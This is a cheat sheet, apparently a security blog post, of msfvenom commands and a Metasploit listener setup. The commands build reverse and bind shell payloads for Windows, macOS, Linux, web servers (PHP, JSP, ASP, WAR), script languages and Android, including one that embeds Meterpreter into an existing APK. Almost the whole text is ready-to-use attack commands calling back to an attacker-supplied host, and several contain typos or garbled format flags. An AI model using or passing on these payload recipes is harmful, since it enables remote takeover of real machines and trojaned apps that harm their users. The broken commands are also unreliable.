---
published: true
title: MsfVenom Payload Cheat Sheet
category: Cheatsheet
image: 'https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/metasploit.jpg'
author: F3dai
---
MSFvenom Payload Creator (MSFPC) is a user-friendly multiple payload generator that can be used to generate Metasploit payloads based on user-selected options. MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. msfvenom replaced both msfpayload and msfencode as of June 8th, 2015.

[Offensive Security](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

### Metasploit Payload Listener

<pre>msfconsole
use exploit/multi/handler
set [payload-name]
set [ip-address]
set [port]
Run</pre>

### Windows Payloads

Windows Meterpreter Reverse Shell: 

<pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe</pre>

Windows Reverse Shell:

<pre>msfvenom -p windows/shell/reverse_tcp lhost=ip-address lport=port -f exe > payload-name.exe</pre>

Windows Encoded Meterpreter Reverse Shell:

<pre>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 2 -f exe > payload-name.exe</pre>

Windows Meterpreter Reverse Shellcode

<pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f &lt platform </pre>

### MacOS Payloads

macOS Bind Shell:

<pre>msfvenom -p osx/x86/shell_bind_tcp rhost=ip-address lport=port-f macho > payload-name.macho</pre>

macOS Reverse Shell:

<pre>msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f macho > payload-name.macho</pre>

macOS Reverse TCP Shellcode:

<pre>msfvenom -p osx/x86/shell_reverse_tcp lhost=ip-address lport=port -f &lt platform </pre>

### Linux Payloads

Linux Meterpreter TCP Reverse Shell:

<pre>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f elf > payload-name.elf</pre>

Linux Bind TCP Shell:

<pre>msfvenom -p generic/shell_bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf</pre>

Linux Bind Meterpreter TCP Shell:

<pre> msfvenom -p linux/x86/meterpreter/bind_tcp rhost=ip-address lport=port -f elf > payload-name.elf</pre>

Linux Meterpreter Reverse Shellcode:

<pre> msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip-address lport=port -f &lt; platform </pre>

### Web-based Payloads

PHP Meterpreter Reverse Shell:

<pre> msfvenom -p php/meterpreter_reverse_tcp lhost=ip-address LPORT=port -f raw > payload-name.php</pre>

JSP Java Meterpreter Reverse Shell:

 <pre>msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f raw > payload-name.jsp</pre>

ASP Meterpreter Reverse Shell:

<pre> msfvenom -p windows/meterpreter/reverse_tcp lhost=ip-address lport=port -f asp > payload-nmae.asp</pre>

WAR Reverse TCP Shell:

 <pre>msfvenom -p java/jsp_shell_reverse_tcp lhost=ip-address lport=port -f war > payload-name.war</pre>

### Script-Based Payloads

Perl Unix Reverse shell:

<pre> msfvenom -p cmd/unix/reverse_perl lhost=ip-address lport=port -f raw > payload-name.pl</pre>

Bash Unix Reverse Shell:

 <pre>msfvenom -p cmd/unix/reverse_bash lhost=ip-address lport=port -f raw > payload-name.sh</pre>

Python Reverse Shell:

 <pre>msfvenom -p cmd/unix/reverse_python lhost=ip-address lport=port -f raw > payload-name.py</pre>

### Android Payloads

Android Meterpreter reverse Payload:

<pre>msfvenom –p android/meterpreter/reverse_tcp lhost=ip-address lport=port R > payload-name.apk</pre>

Android Embed Meterpreter Payload:

<pre>msfvenom -x &lt;app.apk> android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk</pre>

[**Msf-Venom Payload Cheat Sheet | Meterpreter Payload Cheat Sheet**](/cheatsheet/MsfVenom-Payloads/)
